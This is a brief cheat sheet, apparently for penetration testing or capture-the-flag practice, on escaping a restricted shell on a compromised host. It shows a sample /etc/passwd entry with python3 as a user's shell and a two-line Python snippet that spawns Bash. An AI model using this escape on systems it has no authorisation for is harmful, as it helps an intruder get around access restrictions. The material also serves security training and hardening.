# Escaping Jail Shells
This cheat sheet will cover basic methods to attempt to break out of a jailed shell from a compromised host.
## Escaping Python3 Shell
If Python3 is listed as the shell type for a user in the `/etc/passwd` file like so,
```
daniel:x:1002:1005::/home/daniel:/usr/bin/python3
```
You can simply escape the Python3 `>>>` shell with the following two commands,
```
>>> import subprocess
>>> subprocess.call("/bin/bash")
```
This might be sueful to drop you back to a normal LINUX Bash shell if required, or to make further enumeration easier.
